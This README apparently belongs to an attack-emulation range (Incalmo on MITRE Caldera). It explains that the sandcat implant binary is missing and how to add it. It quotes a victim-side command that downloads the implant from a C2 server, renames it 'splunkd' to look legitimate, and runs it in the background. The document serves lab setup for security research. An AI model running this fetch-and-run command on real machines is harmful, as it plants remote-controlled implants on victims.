# `agents/` — Caldera sandcat implant (MISSING from this repo)

The C2 server serves files from this directory at `POST /agent/download`
(`incalmo/c2server/routes/file_routes.py`, `AGENTS_DIR`). The attack chain fetches
the implant from here — e.g. `incalmo/c2server/payloads/strutsExploit.py` runs on
a victim:

    curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' <c2>/agent/download > splunkd
    chmod +x splunkd; ./splunkd -server <c2> -group red &

**This directory was not included in the uploaded repo** (never tracked in git
history). The Docker build (`docker/attacker/incalmo.Dockerfile`) therefore fails
at `COPY ./incalmo/c2server/agents /agents`, and the attacker also cannot obtain
its initial foothold, so no episode runs.

## What to put here

A compiled **Caldera gocat / sandcat** agent binary named **`sandcat.go`** (the
Linux build that victims execute). Get it from your full Incalmo distribution /
release assets, or build it from MITRE Caldera's `sandcat` plugin (`gocat`), e.g.
a Linux amd64 build placed here as `sandcat.go`. Add any other platform builds the
scenarios need.

Once `sandcat.go` is in this directory, rebuild and start the range:

    docker compose -f docker/docker-compose.yml up -d --build
